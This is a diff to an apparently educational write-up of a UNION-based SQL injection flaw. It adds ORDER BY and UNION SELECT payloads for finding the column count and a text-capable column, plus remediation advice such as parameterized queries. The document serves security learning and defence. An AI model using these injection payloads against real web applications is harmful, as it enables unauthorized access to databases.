@@ -13,11 +13,23 @@ This vulnerability allows an attacker to manipulate SQL queries using UNION-base
 **Determining the Number of Columns:**  
 The vulnerability was tested using two common techniques to determine the number of columns returned by the SQL query:
 - `ORDER BY`
+Example payloads:
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+' ORDER BY 4--  
 - `UNION SELECT`
 Example payloads:  
 ' UNION SELECT NULL--  
 ' UNION SELECT NULL,NULL--  
-' UNION SELECT NULL,NULL,NULL--  
+' UNION SELECT NULL,NULL,NULL--
+  
+**Find a string-compatible column:** 
+After identifying the correct number of columns, the next step is to determine which column can display text data in the web application.
+
+This is tested by replacing one NULL value with a string.
+- `UNION SELECT` Example payload: 
+' UNION SELECT NULL, 'abc', NULL--  
 
 ## Evidence Step 1 - Determining the Number of Columns
 **Method 1 — ORDER BY**
@@ -45,5 +57,8 @@ Example payloads:
   <img width="627" height="396" alt="image" src="https://github.com/user-attachments/assets/fa4e1ac9-6067-45ef-88b4-71905b1843e8" />
 
 ## Recommendation
-- 
-- 
+- Use parameterized queries (prepared statements) to prevent SQL injection
+- Validate and sanitize all user inputs
+- Avoid directly concatenating user input into SQL queries
+- Apply least-privilege database access controls
+- Use a Web Application Firewall (WAF) as an additional layer of defense
